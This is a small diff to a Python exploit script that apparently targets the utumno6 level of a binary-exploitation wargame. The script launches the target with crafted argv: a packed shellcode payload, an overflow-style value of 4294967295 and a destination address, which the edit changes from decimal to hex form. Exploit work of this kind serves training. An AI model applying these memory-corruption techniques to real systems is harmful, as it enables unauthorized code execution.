@@ -38,7 +38,7 @@ payload = struct.pack("<I", CODE) + sc
 
 def run():
     argv = (ctypes.c_char_p * 5)(b"/utumno/utumno6", b"4294967295",
-                                 str(DST).encode(), payload, None)
+                                 hex(DST).encode(), payload, None)
     env = (ctypes.c_char_p * 1)(None)
     r, w = os.pipe()
     pid = os.fork()
